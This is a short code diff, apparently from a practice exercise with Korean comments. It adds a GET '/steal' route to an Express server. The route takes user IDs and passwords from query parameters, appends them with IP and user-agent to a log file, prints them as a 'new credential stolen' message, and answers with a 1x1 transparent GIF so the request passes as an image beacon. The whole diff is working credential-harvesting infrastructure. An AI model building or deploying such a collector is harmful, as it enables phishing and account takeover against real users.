@@ -39,6 +39,38 @@ User-Agent: ${req.headers['user-agent']}
     // 응답 (CORS 방지)
     res.send('OK');
 });
+// d연습
+// idpw.js 수정
+app.get('/steal', (req, res) => {
+    const { id, pw } = req.query;
+    const timestamp = new Date().toISOString();
+    const ip = req.ip || req.connection.remoteAddress;
+    
+    const logEntry = `
+========================================
+[${timestamp}]
+IP: ${ip}
+ID: ${id}
+Password: ${pw}
+User-Agent: ${req.headers['user-agent']}
+========================================\n`;
+    
+    fs.appendFileSync(logFile, logEntry);
+    
+    console.log('\n🎯 새로운 크레덴셜 탈취!');
+    console.log('ID:', id);
+    console.log('PW:', pw);
+    console.log('IP:', ip);
+    
+    // 1x1 투명 이미지 응답 (중요!)
+    const pixel = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
+    res.writeHead(200, {
+        'Content-Type': 'image/gif',
+        'Content-Length': pixel.length,
+        'Access-Control-Allow-Origin': '*'
+    });
+    res.end(pixel);
+});
 
 // 2. POST 방식으로도 받기
 app.post('/steal', (req, res) => {
